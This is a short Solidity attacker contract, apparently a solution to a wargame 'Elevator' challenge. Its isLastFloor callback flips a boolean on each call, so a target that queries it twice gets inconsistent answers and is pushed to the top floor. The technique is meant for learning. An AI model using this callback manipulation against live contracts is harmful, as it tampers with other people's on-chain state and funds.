// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

interface IElevator {
    function goTo(uint256 _floor) external;
}

contract ElevatorAttacker {
    bool public toggle;
    IElevator public elevator;

    constructor(address _elevator) {
        elevator = IElevator(_elevator);
    }

    function attack() public {
        elevator.goTo(42);
    }

    function isLastFloor(uint256) external returns (bool) {
        toggle = !toggle;
        return toggle;
    }
}
